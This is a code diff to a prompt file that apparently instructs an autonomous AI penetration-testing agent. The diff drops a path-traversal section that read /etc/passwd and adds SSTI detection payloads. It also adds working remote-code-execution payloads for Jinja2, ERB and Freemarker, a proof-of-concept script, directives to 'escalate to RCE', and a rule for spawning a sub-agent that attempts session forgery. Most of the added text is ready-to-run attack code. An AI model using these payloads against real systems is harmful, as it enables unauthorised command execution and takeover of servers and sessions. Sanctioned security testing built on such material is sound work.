@@ -1,11 +1,11 @@
 /**
- * Generic testing methodology for SSRF, XXE, SSTI, CSRF, Path Traversal
+ * Generic testing methodology for SSRF, XXE, SSTI, CSRF
  */
 
 export const GENERIC_TESTING_PROMPT = `
 # Generic Vulnerability Testing Methodology
 
-This guide covers testing for: SSRF, XXE, SSTI, CSRF, and Path Traversal.
+This guide covers testing for: SSRF, XXE, SSTI, and CSRF.
 
 # Session Outcome Guidance
 
@@ -100,79 +100,109 @@ curl -s -X POST "\$TARGET" \\
 
 ## SSTI (Server-Side Template Injection)
 
-### Testing Approach
+**CRITICAL: SSTI leads to Remote Code Execution (RCE). Always test for SSTI when input is reflected.**
+
+### When to Test for SSTI
+- User input appears in the response
+- Application uses template engines (check for Jinja2, ERB, Twig, Freemarker, Velocity, Pebble)
+- Error messages mention template rendering
+- Application is built with Python/Flask, Ruby/Rails, Java, PHP
+
+### Step 1: Detect SSTI (Mathematical Evaluation)
 
 \`\`\`bash
-# STEP 1: AUTHENTICATION (if needed)
-SESSION="[SESSION_COOKIE]"
-
-# STEP 2: TEST TEMPLATE INJECTION
-payloads=(
-  "{{7*7}}"                 # Jinja2/Twig
-  "\${7*7}"                 # Freemarker
-  "<%=7*7%>"                # ERB
+# Test ALL template syntaxes - different engines use different delimiters
+ssti_detection_payloads=(
+  "{{7*7}}"           # Jinja2, Twig, Nunjucks
+  "{{7*'7'}}"         # Jinja2 (string multiplication)
+  "<%= 7*7 %>"        # ERB (Ruby)
+  "\${7*7}"           # Freemarker, Velocity, Pebble (Java)
+  "#{7*7}"            # Ruby interpolation
+  "\${{7*7}}"         # Some Java frameworks
+  "@(7*7)"            # Razor (ASP.NET)
+  "*{7*7}"            # Thymeleaf (Java)
 )
 
-for payload in "\${payloads[@]}"; do
+for payload in "\${ssti_detection_payloads[@]}"; do
   encoded=\$(echo -n "\$payload" | jq -sRr @uri)
-  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?name=\$encoded")
+  response=\$(curl -s "\$TARGET?param=\$encoded")
 
+  # Key indicator: 49 appears instead of the literal expression
   if echo "\$response" | grep -q "49"; then
-    echo "[+] SSTI: Template evaluation confirmed"
+    echo "[+] SSTI DETECTED with: \$payload"
+    echo "[*] Template engine evaluates expressions - escalate to RCE"
   fi
 done
 \`\`\`
 
-### POC Structure
-\`\`\`bash
-#!/bin/bash
-# POC: SSTI in [Parameter]
-# Objective: [Achieve RCE]
+### Step 2: Identify Template Engine
 
-TARGET="[TARGET_URL]"
-SESSION="[SESSION_COOKIE]"
+Based on which payload works, identify the engine:
 
-# The payload that achieved RCE:
-PAYLOAD="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
-curl -s -H "Cookie: \$SESSION" "\$TARGET?name=\$(echo -n "\$PAYLOAD" | jq -sRr @uri)"
-\`\`\`
+| Payload | Engine | Framework |
+|---------|--------|-----------|
+| \`{{7*7}}\` → 49 | Jinja2/Twig | Python Flask, PHP Symfony |
+| \`<%= 7*7 %>\` → 49 | ERB | Ruby on Rails |
+| \`\${7*7}\` → 49 | Freemarker | Java Spring |
+| \`#{7*7}\` → 49 | Ruby | Ruby applications |
+| \`*{7*7}\` → 49 | Thymeleaf | Java Spring |
 
-## Path Traversal / LFI
+### Step 3: Escalate to RCE
 
-### Testing Approach
+**Once SSTI is confirmed, escalate to command execution:**
 
 \`\`\`bash
-# STEP 1: AUTHENTICATION (if needed)
-SESSION="[SESSION_COOKIE]"
-
-# STEP 2: TEST TRAVERSAL
-payloads=(
-  "../../../etc/passwd"
-  "....//....//....//etc/passwd"
-  "..%2f..%2f..%2fetc%2fpasswd"
+# Jinja2 RCE payloads
+jinja2_rce=(
+  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+  "{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}"
 )
 
-for payload in "\${payloads[@]}"; do
-  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?file=\$payload")
+# ERB (Ruby) RCE payloads
+erb_rce=(
+  "<%= \\\`id\\\` %>"
+  "<%= system('id') %>"
+  "<%= IO.popen('id').read %>"
+)
 
-  if echo "\$response" | grep -qE "root:x:"; then
-    echo "[+] Path Traversal: File read successful"
-  fi
-done
+# Freemarker RCE payloads
+freemarker_rce=(
+  "\${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+)
 \`\`\`
 
 ### POC Structure
 \`\`\`bash
 #!/bin/bash
-# POC: Path Traversal in [Parameter]
-# Objective: [Read sensitive files]
+# POC: SSTI → RCE in [Parameter]
+# CWE-94: Improper Control of Generation of Code (Code Injection)
 
 TARGET="[TARGET_URL]"
 SESSION="[SESSION_COOKIE]"
 
-# The traversal payload that worked:
-curl -s -H "Cookie: \$SESSION" "\$TARGET?file=../../../etc/passwd"
+# STEP 1: Confirm SSTI
+echo "[*] Testing for SSTI..."
+response=\$(curl -s "\$TARGET?param={{7*7}}")
+if echo "\$response" | grep -q "49"; then
+  echo "[+] SSTI confirmed - template evaluates expressions"
+fi
+
+# STEP 2: Escalate to RCE
+echo "[*] Escalating to RCE..."
+RCE_PAYLOAD="<%= \\\`whoami\\\` %>"  # Adjust based on detected engine
+response=\$(curl -s "\$TARGET?param=\$(echo -n "\$RCE_PAYLOAD" | jq -sRr @uri)")
+echo "[+] RCE Result: \$response"
 \`\`\`
+
+### SSTI vs XSS - Key Distinction
+
+| Observation | Classification | Severity |
+|-------------|----------------|----------|
+| \`{{7*7}}\` returns \`49\` | SSTI | CRITICAL (RCE) |
+| \`{{7*7}}\` returns \`{{7*7}}\` literally | NOT SSTI | - |
+| \`<script>alert(1)</script>\` executes | XSS | HIGH |
+
+**Always test SSTI first when input is reflected - it's far more dangerous than XSS.**
 
 ## CSRF (Cross-Site Request Forgery)
 
@@ -238,6 +268,25 @@ Every finding must demonstrate:
 3. **Impact shown** - Actual data access or achieved outcome
 4. **Working payload** - The exact technique that works
 5. **Objective progress** - Contribution to session goal
+
+## CRITICAL: Detect & Spawn Crypto Testing
+
+**If you encounter ANY of these error messages, spawn a crypto agent immediately:**
+- "Invalid IV" or "IV size" errors
+- "Padding" errors (PKCS#7, padding invalid)
+- "Decryption" or "decrypt" errors
+- "Cipher", "CBC", "ECB", "AES" in error messages
+- Hex-encoded session cookies that are block-aligned (32, 48, 64 chars)
+
+**When detected, use spawn_vulnerability_test:**
+\`\`\`
+spawn_vulnerability_test({
+  vulnerabilityClass: "crypto",
+  objective: "Test encrypted session for cryptographic vulnerabilities - unauthenticated encryption, cipher mode attacks, session forgery",
+  evidence: "<the error message or observation>",
+  priority: "critical"
+})
+\`\`\`
 
 ## Remember
 
